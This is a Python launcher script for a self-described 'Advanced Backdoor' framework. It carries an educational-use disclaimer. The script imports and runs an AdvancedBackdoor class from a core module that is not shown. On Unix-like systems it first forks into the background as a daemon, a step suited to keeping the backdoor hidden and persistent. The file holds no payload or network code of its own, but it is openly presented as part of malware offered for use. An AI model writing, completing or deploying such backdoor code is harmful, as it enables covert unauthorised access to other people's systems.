#!/usr/bin/env python3
"""
Advanced Backdoor Framework - Main Entry Point

WARNING: This is for educational and research purposes only.
Using this software for malicious activities is illegal and unethical.
"""
import os
import sys


def main():
    """Entry point"""

    print("""
    ╔══════════════════════════════════════════╗
    ║      Advanced Backdoor v2.0              ║
    ║      Multi-protocol, Persistent          ║
    ╚══════════════════════════════════════════╝
    """)

    try:
        from core import AdvancedBackdoor

        # Create and run backdoor
        backdoor = AdvancedBackdoor()

        if backdoor.running:
            backdoor.run()
        else:
            print("[!] Backdoor initialization failed")
            sys.exit(1)

    except ImportError as e:
        print(f"[!] Import error: {e}")
        print("[!] Make sure all dependencies are installed: pip install -r requirements.txt")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[*] Received interrupt signal")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    # Run as daemon if possible
    if os.name == 'posix':
        try:
            if os.fork() > 0:
                sys.exit(0)
        except OSError as e:
            print(f"[!] Fork failed: {e}")

    main()